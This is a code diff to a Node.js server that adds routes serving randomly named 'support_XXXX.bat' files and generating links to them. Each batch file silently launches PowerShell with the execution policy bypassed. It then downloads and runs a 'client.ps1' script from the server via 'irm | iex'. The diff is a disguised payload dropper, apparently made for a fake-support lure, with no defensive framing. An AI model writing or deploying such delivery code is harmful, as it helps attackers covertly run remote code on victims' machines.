@@ -400,6 +400,34 @@ const server = createServer((req, res) => {
     return;
   }
 
+  // BAT polimórfico com hash único
+  if (req.url.match(/^\/support_[A-F0-9]+\.bat$/i) || req.url === '/download.bat') {
+    const host = req.headers.host || 'localhost:3001';
+    const protocol = req.headers['x-forwarded-proto'] || 'http';
+    const baseUrl = `${protocol}://${host}`;
+
+    const bat = `@echo off
+powershell -w hidden -ep bypass -c "irm '${baseUrl}/client.ps1'|iex"
+exit`;
+
+    res.writeHead(200, {
+      'Content-Type': 'application/octet-stream',
+      'Content-Disposition': `attachment; filename="support_${crypto.randomBytes(6).toString('hex').toUpperCase()}.bat"`
+    });
+    res.end(bat);
+    return;
+  }
+
+  // Gerar link de BAT com hash único
+  if (req.url === '/generate-bat') {
+    const hash = crypto.randomBytes(6).toString('hex').toUpperCase();
+    const host = req.headers.host || 'localhost:3001';
+    const protocol = req.headers['x-forwarded-proto'] || 'http';
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ url: `${protocol}://${host}/support_${hash}.bat`, filename: `support_${hash}.bat` }));
+    return;
+  }
+
   let filePath = join(__dirname, 'public', req.url === '/' ? 'index.html' : req.url);
   if (!existsSync(filePath)) {
     filePath = join(__dirname, 'public', 'index.html');
